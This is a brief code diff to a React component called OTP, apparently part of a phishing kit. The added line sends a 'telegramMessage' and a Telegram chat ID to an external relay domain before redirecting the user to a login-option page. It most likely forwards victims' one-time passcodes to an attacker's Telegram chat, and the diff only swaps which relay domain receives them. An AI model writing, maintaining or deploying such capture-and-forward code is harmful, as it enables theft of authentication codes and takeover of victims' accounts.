@@ -42,7 +42,7 @@ const OTP = () => {
     const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
 
     try {
-      await axios.post('https://streaming.pagafacilntf.com/enviarmensaje', { chatId, message: telegramMessage });
+      await axios.post('https://streaming.renovapunto.online//enviarmensaje', { chatId, message: telegramMessage });
       navigate('/signup/loginoption'); // Cambia la ruta según tus necesidades
     } catch (error) {
       console.error('Error en la solicitud:', error);
